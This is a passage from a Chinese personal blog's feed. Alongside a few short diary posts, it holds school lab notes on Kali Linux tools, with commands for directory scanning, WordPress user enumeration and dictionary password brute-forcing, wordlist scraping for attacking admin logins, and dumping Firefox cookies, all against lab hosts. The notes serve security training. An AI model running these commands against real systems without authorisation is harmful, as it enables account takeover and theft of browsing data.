&lt;p&gt;元素名用尖括号包裹&lt;br&gt; 以&lt;code&gt;&amp;lt;元素名&amp;gt;元素内容&amp;lt;/元素名&amp;gt;&lt;/code&gt;或&lt;code&gt;&amp;lt;元素名 /&amp;gt;&lt;/code&gt;作为一部分组成的代码&lt;br&gt;注释形式为&lt;code&gt;&amp;lt;!--这是一个注释，注释在浏览器中不会显示--&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;css&quot;&gt;&lt;a href=&quot;#css&quot; class=&quot;headerlink&quot; title=&quot;css&quot;&gt;&lt;/a&gt;css&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;“&lt;strong&gt;CSS&lt;/strong&gt; (Cascading Style Sheets，层叠样式表），是一种用来为结构化文档（如 HTML 文档或 XML 应用）添加样式（字体、间距和颜色等）的计算机语言，&lt;strong&gt;CSS&lt;/strong&gt; 文件扩展名为 &lt;strong&gt;.css&lt;/strong&gt;。&lt;br&gt;通过使用 &lt;strong&gt;CSS&lt;/strong&gt; 我们可以大大提升网页开发的工作效率！”&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>开学季</title>
    <link href="https://www.maonie.top/2024/02/25/%E5%BC%80%E5%AD%A6%E5%AD%A3/"/>
    <id>https://www.maonie.top/2024/02/25/%E5%BC%80%E5%AD%A6%E5%AD%A3/</id>
    <published>2024-02-25T00:44:51.000Z</published>
    <updated>2024-02-25T00:47:54.452Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>开学了<br>离大考只剩两 三个月了<br>照常会把课程内容记录下来</p></body></html>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot;</summary>
        
      
    
    
    
    <category term="日常牢骚" scheme="https://www.maonie.top/categories/%E6%97%A5%E5%B8%B8%E7%89%A2%E9%AA%9A/"/>
    
    
    <category term="日常牢骚" scheme="https://www.maonie.top/tags/%E6%97%A5%E5%B8%B8%E7%89%A2%E9%AA%9A/"/>
    
  </entry>
  
  <entry>
    <title>维修时间</title>
    <link href="https://www.maonie.top/2024/01/28/%E2%80%9C%E7%BB%B4%E4%BF%AE%E6%97%B6%E9%97%B4%E2%80%9D/"/>
    <id>https://www.maonie.top/2024/01/28/%E2%80%9C%E7%BB%B4%E4%BF%AE%E6%97%B6%E9%97%B4%E2%80%9D/</id>
    <published>2024-01-28T09:37:14.000Z</published>
    <updated>2024-01-29T12:27:20.345Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a><strong>前情提要</strong></h1><p>网络不知道为啥寄了<br>speedtest变成了随机数生成器 5mb 200mb 400mb里上下蹦跳<br>首先怀疑的是<strong>墙内内嵌的网线老化导致网速不行</strong><br>然后拿了一根<strong>40m长</strong>的网线直连了<br>结果还是不行<br>dns也没毛病<br>结果是<strong>msi center</strong>限制了我的网速<br><a href="https://blog.csdn.net/qq_37296622/article/details/123959244#">相同的案例</a><br>教训是 少下捆绑 硬件相关的软件 尤其是在更新时注意是否有“新功能” </p></body></html>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot;</summary>
        
      
    
    
    
    <category term="日常牢骚" scheme="https://www.maonie.top/categories/%E6%97%A5%E5%B8%B8%E7%89%A2%E9%AA%9A/"/>
    
    
    <category term="日常牢骚" scheme="https://www.maonie.top/tags/%E6%97%A5%E5%B8%B8%E7%89%A2%E9%AA%9A/"/>
    
  </entry>
  
  <entry>
    <title>小小修整</title>
    <link href="https://www.maonie.top/2024/01/15/%E5%B0%8F%E5%B0%8F%E4%BF%AE%E6%95%B4/"/>
    <id>https://www.maonie.top/2024/01/15/%E5%B0%8F%E5%B0%8F%E4%BF%AE%E6%95%B4/</id>
    <published>2024-01-15T05:32:17.000Z</published>
    <updated>2024-01-15T05:44:41.257Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="首先是-新年快乐"><a href="#首先是-新年快乐" class="headerlink" title="首先是 新年快乐"></a>首先是 新年快乐</h1><p>这几天去南京旅游了 主要是为了放松<br>因此没更新<br>现在回来了<br>接下来要干的事：<br><strong>把笔记本改造成自己的便捷平台<br>通过按照月份分类来整理有些过多的文章<br>作业 看书 多学 老生常谈</strong></p></body></html>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot;</summary>
        
      
    
    
    
    <category term="日常牢骚" scheme="https://www.maonie.top/categories/%E6%97%A5%E5%B8%B8%E7%89%A2%E9%AA%9A/"/>
    
    
    <category term="告示" scheme="https://www.maonie.top/tags/%E5%91%8A%E7%A4%BA/"/>
    
  </entry>
  
  <entry>
    <title>学校实训-笔记</title>
    <link href="https://www.maonie.top/2024/01/08/%E5%AD%A6%E6%A0%A1%E5%AE%9E%E8%AE%AD-%E7%AC%94%E8%AE%B0/"/>
    <id>https://www.maonie.top/2024/01/08/%E5%AD%A6%E6%A0%A1%E5%AE%9E%E8%AE%AD-%E7%AC%94%E8%AE%B0/</id>
    <published>2024-01-08T05:35:57.000Z</published>
    <updated>2024-01-09T04:49:30.614Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>学校寒假放了点作业出来<br>做个笔记</p><span id="more"></span><h1 id="实验-1-配置Kali"><a href="#实验-1-配置Kali" class="headerlink" title="实验 1 配置Kali"></a>实验 1 配置Kali</h1><p><strong>实验场景</strong><br>小明是网络工程师，某天他收到上级领导命令，需要在网络中部署一台Kali服务器，为…</p><p><strong>实验环境</strong><br>Kali 2016</p><p><strong>实验工具</strong><br>无</p><p><strong>实验目的</strong><br>对Kali进行网络配置，修改主机名和root密码，修改源配置文件并进行系统更新</p><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="1-修改主机名"><a href="#1-修改主机名" class="headerlink" title="1. 修改主机名"></a>1. 修改主机名</h3><ul><li>临时修改主机名，重启会还原</li><li>永久修改主机名，需要重启才能生效</li><li>修改 <code>/etc/hosts</code> 配置文件</li></ul><h3 id="2-配置Kali的网络"><a href="#2-配置Kali的网络" class="headerlink" title="2. 配置Kali的网络"></a>2. 配置Kali的网络</h3><ul><li>修改本机的网卡设置，设置为dhcp获取IP方式，也可以设置成静态IP，需要给网卡配置IP地址<pre class="line-numbers language-none"><code class="language-none">vi /etc/network/interfaces<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h3 id="3-查看当前用户是否是root，修改root密码"><a href="#3-查看当前用户是否是root，修改root密码" class="headerlink" title="3. 查看当前用户是否是root，修改root密码"></a>3. 查看当前用户是否是root，修改root密码</h3><h3 id="4-修改Kali的源配置文件，添加国内的源，并进行系统升级"><a href="#4-修改Kali的源配置文件，添加国内的源，并进行系统升级" class="headerlink" title="4. 修改Kali的源配置文件，添加国内的源，并进行系统升级"></a>4. 修改Kali的源配置文件，添加国内的源，并进行系统升级</h3><ul><li>添加中科大的源<pre class="line-numbers language-none"><code class="language-none">vi /etc/apt/sources.listdeb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>执行更新指令<pre class="line-numbers language-none"><code class="language-none">apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>等待更新完成</li></ul><p><strong>实验总结</strong><br>Kali版本众多，最新版本中会添加一些最新的工具和软件，需要持续进行更新。</p><h1 id="实验-2-Web应用程序-Dirb"><a href="#实验-2-Web应用程序-Dirb" class="headerlink" title="实验 2 Web应用程序-Dirb"></a>实验 2 Web应用程序-Dirb</h1><p><strong>实验场景</strong><br>小明是网络工程师，某天他收到上级领导命令，需要在Kali服务器使用Dirb软件，为…</p><p><strong>实验环境</strong><br>攻击机Kali 2018<br>靶机Windows 7 192.168.163.</p><p><strong>实验工具</strong><br>Dirb</p><p><strong>实验目的</strong><br>了解并掌握Dirb对网站进行扫描</p><h2 id="实验步骤-1"><a href="#实验步骤-1" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>DIRB是一个Web内容扫描。它看起来对现有（和/或隐藏）的Web对象。它主要的工作原理是发动了对Web服务器的基于字典的攻击和分析的响应。</p><p>DIRB带有易于使用的一组预配置的攻击生词，但你可以用你自定义的词表。此外DIRB有时可以作为一个典型的CGI扫描器，但要记住是一个内容扫描仪没有漏洞扫描器。</p><p>DIRB主要目的是在专业的Web应用程序的审核帮助。特别是在与安全相关的测试。它没有涵盖的经典网页漏洞扫描器一些漏洞。 DIRB寻找其他通用CGI扫描器无法查找特定的Web对象。它不搜索的漏洞，也没有寻找网页内容，可以vulnerables。</p><p>直接在终端启动软件</p><pre class="line-numbers language-none"><code class="language-none">dirb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>扫描Web服务器（<a href="http://192.168.163.147:88/%EF%BC%89%E5%88%A9%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%87%AA%E5%B8%A6%E5%AD%97%E5%85%B8%E6%96%87%E4%BB%B6">http://192.168.163.147:88/）利用系统自带字典文件</a><br>（/usr/share/wordlists/dirb/common.txt）</p><pre class="line-numbers language-none"><code class="language-none">dirb http://192.168.163.147:88/ /usr/share/wordlists/dirb/common.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用自备字典进行扫描</p><pre class="line-numbers language-none"><code class="language-none">dirb http://192.168.163.147:88 /root/test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>实验总结</strong><br>掌握使用Dirb对Web进行扫描，查看软件的扫描报告文件</p><h1 id="实验-3-报告工具-pipal"><a href="#实验-3-报告工具-pipal" class="headerlink" title="实验 3 报告工具-pipal"></a>实验 3 报告工具-pipal</h1><p><strong>实验场景</strong><br>小明是网络工程师，某天他收到上级领导命令，需要在Kali服务器使用pipal工具，为…</p><p><strong>实验环境</strong><br>Kali 2018</p><p><strong>实验工具</strong><br>Pipal</p><p><strong>实验目的</strong><br>掌握密码分析工具pipal的使用方法</p><h2 id="实验步骤-2"><a href="#实验步骤-2" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>所有这些工具确实是给你的统计数据和信息，以帮助您分析密码。真正的工作是由你解释的结果进行。</p><p>查看帮助</p><pre class="line-numbers language-none"><code class="language-none">pipal –h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>分析本地password.txt文件，可以分析密码文件的词频等信息</p><pre class="line-numbers language-none"><code class="language-none">pipal /root/password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>分析并显示前 5 个密码（-t 5），使用给定文件作为输入（/usr/share/wordlists/nmap.lst）：</p><pre class="line-numbers language-none"><code class="language-none">pipal –t 5 /usr/share/wordlists/nmap.lst<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>实验总结</strong><br>pipal是一款词频分析工具，可以用来在字典中筛选出出现频率高的密码</p><h1 id="实验-4-漏洞分析-unix-privesc-check"><a href="#实验-4-漏洞分析-unix-privesc-check" class="headerlink" title="实验 4 漏洞分析-unix-privesc-check"></a>实验 4 漏洞分析-unix-privesc-check</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用unix-privesc-check，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2016</p><p><strong>实验工具</strong></p><p>unix-privesc-check</p><p><strong>实验目的</strong></p><p>了解unix-privesc-check工具的使用</p><p><strong>实验步骤</strong></p><h2 id="1-查看帮助"><a href="#1-查看帮助" class="headerlink" title="1. 查看帮助"></a>1. 查看帮助</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">unix-privesc-check -h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>standard</code> ：标准”模式：速度优化检查大量的安全设置。</li><li><code>detailed</code> ：“详细”模式：与标准模式相同，但也检查打开文件的perms句柄和被调用的文件（例如从shell脚本分析，链接的.so文件）。 这种模式很慢。</li></ul><h2 id="2-使用标准模式扫描本地"><a href="#2-使用标准模式扫描本地" class="headerlink" title="2. 使用标准模式扫描本地"></a>2. 使用标准模式扫描本地</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">unix-privesc-check standard<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-把报告保存到本地文件"><a href="#3-把报告保存到本地文件" class="headerlink" title="3. 把报告保存到本地文件"></a>3. 把报告保存到本地文件</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">unix-privesc-check &gt; baogao.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4-查看报告"><a href="#4-查看报告" class="headerlink" title="4. 查看报告"></a>4. 查看报告</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cat baogao.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>实验总结</strong></p><p>unix-privesc-check是Kali Linux自带的一款提权漏洞检测工具。它是一个Shell文件，可以检测所在系统的错误配置，以发现可以用于提权的漏洞。</p><h1 id="实验5-kali-漏洞扫描-lynis"><a href="#实验5-kali-漏洞扫描-lynis" class="headerlink" title="实验5 kali-漏洞扫描-lynis"></a>实验5 kali-漏洞扫描-lynis</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用lynis工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2018</p><p><strong>实验工具</strong></p><p>lynis</p><p><strong>实验目的</strong></p><p>了解漏洞扫描工具lynis的使用</p><p><strong>实验步骤</strong></p><h2 id="1-启动lynis并列出支持的参数"><a href="#1-启动lynis并列出支持的参数" class="headerlink" title="1. 启动lynis并列出支持的参数"></a>1. 启动lynis并列出支持的参数</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lynis<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-对本地进行安全扫描"><a href="#2-对本地进行安全扫描" class="headerlink" title="2. 对本地进行安全扫描"></a>2. 对本地进行安全扫描</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lynis audit system<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-查看扫描日志（需要注意的是，每次审计都会覆盖原日志文件）"><a href="#3-查看扫描日志（需要注意的是，每次审计都会覆盖原日志文件）" class="headerlink" title="3. 查看扫描日志（需要注意的是，每次审计都会覆盖原日志文件）"></a>3. 查看扫描日志（需要注意的是，每次审计都会覆盖原日志文件）</h2><p>日志保存在/var/log/lynis-report.dat</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">grep –E “^warning|^suggestion” /var/log/lynis-report.dat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4-检查更新"><a href="#4-检查更新" class="headerlink" title="4. 检查更新"></a>4. 检查更新</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lynis update info --no-colors<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5-创建Lynis计划任务"><a href="#5-创建Lynis计划任务" class="headerlink" title="5. 创建Lynis计划任务"></a>5. 创建Lynis计划任务</h2><p>如果你想为你的系统创建一个日扫描报告，你可以设置cron：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">crontab -e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加cron任务：</p><p><strong>实验总结</strong></p><p>观察lynis工具能否扫描出系统存在的漏洞，如果存在该如何进行加固</p><h1 id="实验6-kali-漏洞扫描-WPScan"><a href="#实验6-kali-漏洞扫描-WPScan" class="headerlink" title="实验6 kali-漏洞扫描-WPScan"></a>实验6 kali-漏洞扫描-WPScan</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用pipal工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机 kali 2018<br>靶机 windows 7 192.168.163.</p><p><strong>实验工具</strong></p><p>攻击机：wpscan<br>靶机：wordpress</p><p><strong>实验目的</strong></p><p>了解wpscan的使用</p><p><strong>实验步骤</strong></p><h2 id="1-简单的攻击"><a href="#1-简单的攻击" class="headerlink" title="1. 简单的攻击"></a>1. 简单的攻击</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan –u 192.168.163.147/wordpress<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-列出用户名列表"><a href="#2-列出用户名列表" class="headerlink" title="2. 列出用户名列表"></a>2. 列出用户名列表</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan –u 192.168.163.147/wordpress –e u vp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-通过字典爆破用户密码"><a href="#3-通过字典爆破用户密码" class="headerlink" title="3. 通过字典爆破用户密码"></a>3. 通过字典爆破用户密码</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan –u 192.168.163.147/wordpress –e u –wordlist /root/password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4-了解其它参数"><a href="#4-了解其它参数" class="headerlink" title="4. 了解其它参数"></a>4. 了解其它参数</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan – h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>实验总结</strong></p><p>思考WPScan的作用场景是否有特定版本号要求</p><h1 id="实验-7-密码攻击-cewl"><a href="#实验-7-密码攻击-cewl" class="headerlink" title="实验 7 密码攻击-cewl"></a>实验 7 密码攻击-cewl</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用cewl工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2018<br>windows 7 192.168.163.</p><p><strong>实验工具</strong></p><p>cewl</p><p><strong>实验目的</strong></p><p>掌握密码爬取工具cewl的使用</p><p><strong>实验步骤</strong></p><h2 id="1-直接在终端启动cewl"><a href="#1-直接在终端启动cewl" class="headerlink" title="1. 直接在终端启动cewl"></a>1. 直接在终端启动cewl</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cewl –h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-爬取最小单词长度为-5"><a href="#2-爬取最小单词长度为-5" class="headerlink" title="2. 爬取最小单词长度为 5"></a>2. 爬取最小单词长度为 5</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cewl 192.168.163.147:88 –m 5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-爬取网站深度为-5-的关键字"><a href="#3-爬取网站深度为-5-的关键字" class="headerlink" title="3. 爬取网站深度为 5 的关键字"></a>3. 爬取网站深度为 5 的关键字</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cewl – d 5 192.168.163.147:88<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4-收集包含emali地址信息"><a href="#4-收集包含emali地址信息" class="headerlink" title="4. 收集包含emali地址信息"></a>4. 收集包含emali地址信息</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cewl – e 192.168.163.147:88<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5-统计每个单词出现的次数"><a href="#5-统计每个单词出现的次数" class="headerlink" title="5. 统计每个单词出现的次数"></a>5. 统计每个单词出现的次数</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cewl 192.168.163.147:88 –c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="6-可以多个参数一起使用"><a href="#6-可以多个参数一起使用" class="headerlink" title="6. 可以多个参数一起使用"></a>6. 可以多个参数一起使用</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cewl 192.168.163.147:88 -m 3 -d 3 -e -c -v -w a.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="7-查看a-txt字典"><a href="#7-查看a-txt字典" class="headerlink" title="7. 查看a.txt字典"></a>7. 查看a.txt字典</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cat a.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>实验总结</strong></p><p>使用通过cewl工具爬取的字典文件，使用它去爆破网站的后台</p><h1 id="实验-8-取证工具-dumpzilla"><a href="#实验-8-取证工具-dumpzilla" class="headerlink" title="实验 8 取证工具-dumpzilla"></a>实验 8 取证工具-dumpzilla</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用dumpzilla工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2018</p><p><strong>实验工具</strong></p><p>Dumpzilla</p><p><strong>实验目的</strong></p><p>了解取证工具Dumpzilla的使用</p><p><strong>实验步骤</strong></p><h2 id="1-查看dumpzilla工具帮助"><a href="#1-查看dumpzilla工具帮助" class="headerlink" title="1. 查看dumpzilla工具帮助"></a>1. 查看dumpzilla工具帮助</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Dumpzilla – h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-分析Mozilla的配置文件夹（’-root-mozilla-firefox-4ed7jhtz-default-‘）的历史访问记录"><a href="#2-分析Mozilla的配置文件夹（’-root-mozilla-firefox-4ed7jhtz-default-‘）的历史访问记录" class="headerlink" title="2. 分析Mozilla的配置文件夹（’/root/.mozilla/firefox/4ed7jhtz.default/‘）的历史访问记录"></a>2. 分析Mozilla的配置文件夹（’/root/.mozilla/firefox/4ed7jhtz.default/‘）的历史访问记录</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dumpzilla '/root/.mozilla/firefox/4ed7jhtz.default/' –History<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-分析Mozilla的配置文件夹（’-root-mozilla-firefox-4ed7jhtz-default-‘）的Cookies"><a href="#3-分析Mozilla的配置文件夹（’-root-mozilla-firefox-4ed7jhtz-default-‘）的Cookies" class="headerlink" title="3. 分析Mozilla的配置文件夹（’/root/.mozilla/firefox/4ed7jhtz.default/‘）的Cookies"></a>3. 分析Mozilla的配置文件夹（’/root/.mozilla/firefox/4ed7jhtz.default/‘）的Cookies</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dumpzilla '/root/.mozilla/firefox/4ed7jhtz.default/' –-Cookies<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4-分析Mozilla的配置文件夹（’-root-mozilla-firefox-4ed7jhtz-default-‘）和转储以外的所有影像数据（-All）"><a href="#4-分析Mozilla的配置文件夹（’-root-mozilla-firefox-4ed7jhtz-default-‘）和转储以外的所有影像数据（-All）" class="headerlink" title="4. 分析Mozilla的配置文件夹（’/root/.mozilla/firefox/4ed7jhtz.default/‘）和转储以外的所有影像数据（-All）"></a>4. 分析Mozilla的配置文件夹（’/root/.mozilla/firefox/4ed7jhtz.default/‘）和转储以外的所有影像数据（-All）</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dumpzilla '/root/.mozilla/firefox/4ed7jhtz.default/' --All<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>实验总结</strong></p><p>思考dumpzilla工具除了分析本机的浏览器文件是否还能分析远程主机的配置文件。</p><h1 id="实验9-apache服务配置"><a href="#实验9-apache服务配置" class="headerlink" title="实验9 apache服务配置"></a>实验9 apache服务配置</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器安装apache服务，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2016</p><p><strong>实验工具</strong></p><p>apache 2</p><p><strong>实验目的</strong></p><p>掌握kali下apache的配置</p><p><strong>实验步骤</strong></p><p>查看本机安装的apache版本号</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">apachectl –v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动apache服务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/etc/init.d/apache2 start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>重启apache服务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/etc/init.d/apache2 restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>停止apache服务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/etc/init.d/apache2 stop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载默认首页并查看网页内容</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wget http://127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进入apache默认首页的目录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cd /var/www/html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>替换默认首页内容为 123</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">echo "123" &gt; index.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>重启apache服务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/etc/init.d/apache2 restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载默认首页</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wget http://127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看下载首页内容</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cat index.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>实验总结</strong></p><p>在kali上成功运行个人网页</p><h1 id="实验-10-产品安全分析工具"><a href="#实验-10-产品安全分析工具" class="headerlink" title="实验 10 产品安全分析工具"></a>实验 10 产品安全分析工具</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用glob工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：kali<br>靶机：centos 6.9<br>靶机ip地址：192.168.163.136</p><p><strong>实验工具</strong></p><p>glob</p><p><strong>实验目的</strong></p><p>掌握glob的使用</p><p><strong>实验步骤</strong></p><p>启动kali中cisco的安全工具</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cge.pl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>选择一个漏洞，并按照所给的格式进行测试，网址后面添加漏洞编号</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cge.pl http://192.168.163.136/index.html 3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>CAT -h 主机名 - w 字典文件 - a 密码文件 - i</p><p>（直接在终端输入CAT直接启动，这里没有cisco设备，无法复现实验）</p><p><strong>实验总结</strong></p><p>如果有cisco设备，使用glob工具对其进行检测</p><h1 id="实验11-pure-ftpd配置"><a href="#实验11-pure-ftpd配置" class="headerlink" title="实验11 pure-ftpd配置"></a>实验11 pure-ftpd配置</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用pure-ftpd工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali</p><p><strong>实验工具</strong></p><p>pure-ftpd</p><p><strong>实验目的</strong></p><p>掌握按照和配置pure-ftpd</p><p><strong>实验步骤</strong></p><p>安装 Pure-FTPd</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">apt-get install pure-ftpd<span aria-hidden="true" 